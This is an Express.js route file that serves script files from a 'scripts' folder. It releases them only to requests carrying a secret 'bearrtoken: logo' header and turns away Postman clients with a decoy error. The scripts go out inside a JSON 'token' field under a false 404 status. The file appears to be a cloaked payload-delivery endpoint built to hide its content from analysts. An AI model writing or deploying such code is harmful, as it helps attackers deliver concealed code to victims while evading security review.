import { Router } from "express";
import path from "path";
import { readFile } from "fs/promises";
import { fileURLToPath } from "url";

const router = Router();

// 🔧 FIX: resolve absolute directory (ESM-safe)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

router.get("/:id", async (req, res) => {
  const secretHeader = req.headers["bearrtoken"];
  const userAgent = req.headers["user-agent"] || "";
  const isPostman =
    userAgent.toLowerCase().includes("postman") ||
    req.headers["postman-token"];

  if (isPostman || secretHeader !== "logo") {
    return res.json({
      err: "backend apis are not working now."
    });
  }

  const id = req.params.id;

  switch (id) {
    case "v3": {
      const script7 = await readFile(
        path.join(__dirname, "scripts", "101"),
        "utf-8"
      );
      return res.status(404).json({ token: script7 });
    }

    default: {
      const script = await readFile(
        path.join(__dirname, "scripts", "930"),
        "utf-8"
      );
      return res.status(404).json({ token: script });
    }
  }
});

export default router;
